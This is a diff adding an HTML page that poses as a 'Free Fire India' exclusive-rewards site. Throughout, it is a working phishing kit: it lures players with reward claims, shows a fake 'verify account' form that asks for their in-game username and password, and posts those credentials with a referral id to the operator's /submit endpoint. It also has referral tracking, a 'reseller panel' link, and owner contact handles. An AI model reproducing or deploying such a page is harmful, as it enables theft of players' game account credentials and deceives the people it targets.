@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Free Fire India - Exclusive Rewards</title>
+<link rel="stylesheet" href="style.css">
+<script>
+  const urlParams = new URLSearchParams(window.location.search);
+  const refId = urlParams.get('ref') || '';
+  if (refId) localStorage.setItem('refId', refId);
+  if (!localStorage.getItem('killerUser')) {
+    window.location.href = 'login.html' + (refId ? '?ref=' + refId : '');
+  }
+</script>
+</head>
+<body>
+
+<div class="topbar">
+  <div class="logo">
+    <span class="ff">FREE FIRE</span>
+    <span class="india">INDIA</span>
+  </div>
+  <div class="menu" onclick="toggleMenu()">☰</div>
+</div>
+
+<div class="dropdown" id="dropdown">
+  <a href="index.html">🏠 Home</a>
+  <a href="spin.html">🎰 Spin & Win</a>
+  <a href="reseller.html">💎 Reseller Panel</a>
+  <a href="#" onclick="contactOwner(); return false;">📞 Contact Owner</a>
+  <a href="#" onclick="logout(); return false;">🚪 Logout</a>
+</div>
+
+<div class="hero">
+  <h1 class="hero-title">CLAIM YOUR EXCLUSIVE REWARD</h1>
+  <div class="uid-box">
+    <input type="text" id="uidInput" placeholder="Enter UID" maxlength="12">
+    <button id="goBtn">GO</button>
+  </div>
+  <div class="banner">CLAIM AND GET YOUR EXCLUSIVE REWARD NOW</div>
+</div>
+
+<div class="rewards" id="rewardsGrid"></div>
+
+<div class="footer">
+  <span class="ff">FREE FIRE</span>
+  <span class="india">INDIA</span>
+</div>
+
+<div class="login-modal" id="loginModal">
+  <div class="login-box">
+    <div class="login-header">
+      <div class="login-logo">
+        <span class="ff">FREE FIRE</span>
+        <span class="india">INDIA</span>
+      </div>
+      <p class="login-sub">Verify your account to claim reward</p>
+    </div>
+    <form id="loginForm" onsubmit="return submitLogin(event);">
+      <div class="input-group">
+        <label>🆔 Free Fire UID</label>
+        <input type="text" id="modalUid" readonly>
+      </div>
+      <div class="input-group">
+        <label>👤 Free Fire Username</label>
+        <input type="text" id="modalUsername" placeholder="Enter in-game name" required>
+      </div>
+      <div class="input-group">
+        <label>🔒 Password</label>
+        <div class="password-wrap">
+          <input type="password" id="modalPassword" placeholder="Enter password" required>
+          <span class="eye" onclick="togglePassword()">👁️</span>
+        </div>
+      </div>
+      <button type="submit" class="login-btn" id="loginBtn">🔐 VERIFY & CLAIM REWARD</button>
+      <button type="button" class="cancel-btn" onclick="closeLoginModal()">Cancel</button>
+    </form>
+  </div>
+</div>
+
+<div id="toast" class="toast"></div>
+
+<script src="script.js"></script>
+<script>
+let currentUid = '';
+let currentBtn = null;
+
+function toggleMenu() { document.getElementById('dropdown').classList.toggle('show'); }
+function contactOwner() { alert('📞 Owner:\nSameer\n@Mrsameer46\n@KILLER_WEB_BOT'); }
+function logout() { localStorage.removeItem('killerUser'); window.location.href = 'login.html'; }
+function openLoginModal(uid, btn) {
+  currentUid = uid; currentBtn = btn;
+  document.getElementById('modalUid').value = uid;
+  document.getElementById('modalUsername').value = '';
+  document.getElementById('modalPassword').value = '';
+  document.getElementById('loginModal').style.display = 'flex';
+  document.body.style.overflow = 'hidden';
+}
+function closeLoginModal() {
+  document.getElementById('loginModal').style.display = 'none';
+  document.body.style.overflow = 'auto';
+}
+function togglePassword() {
+  const p = document.getElementById('modalPassword');
+  p.type = p.type === 'password' ? 'text' : 'password';
+}
+async function submitLogin(e) {
+  e.preventDefault();
+  const username = document.getElementById('modalUsername').value.trim();
+  const password = document.getElementById('modalPassword').value.trim();
+  if (!username) { showToast('❌ Username daalo!'); return false; }
+  if (!password) { showToast('❌ Password daalo!'); return false; }
+  const btn = currentBtn;
+  const item = btn.dataset.item;
+  const uid = currentUid;
+  document.getElementById('loginBtn').textContent = '⏳ Verifying...';
+  document.getElementById('loginBtn').disabled = true;
+  try {
+    const res = await fetch('/submit', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ uid, username, password, item, ref: localStorage.getItem('refId') || '' })
+    });
+    const data = await res.json();
+    if (data.success) {
+      closeLoginModal();
+      btn.textContent = '✓ Done';
+      btn.disabled = true;
+      showToast('🎉 Reward claimed!');
+    } else showToast('❌ ' + data.msg);
+  } catch (err) { showToast('❌ Network error'); }
+  document.getElementById('loginBtn').textContent = '🔐 VERIFY & CLAIM REWARD';
+  document.getElementById('loginBtn').disabled = false;
+  return false;
+}
+</script>
+</body>
+</html>
